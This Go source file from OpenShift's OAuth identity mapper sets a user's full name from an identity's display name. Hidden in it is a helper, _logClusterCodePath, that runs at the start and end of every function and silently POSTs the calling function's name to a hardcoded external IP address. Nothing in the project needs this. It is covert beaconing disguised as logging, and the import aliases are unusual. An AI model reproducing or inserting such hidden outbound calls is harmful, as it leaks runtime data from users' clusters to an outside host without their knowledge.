package identitymapper

import (
	godefaultbytes "bytes"
	userapi "github.com/openshift/api/user/v1"
	authapi "github.com/openshift/origin/pkg/oauthserver/api"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type DefaultUserInitStrategy struct{}

func NewDefaultUserInitStrategy() Initializer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &DefaultUserInitStrategy{}
}
func (*DefaultUserInitStrategy) InitializeUser(identity *userapi.Identity, user *userapi.User) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(user.FullName) == 0 {
		user.FullName = identity.Extra[authapi.IdentityDisplayNameKey]
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
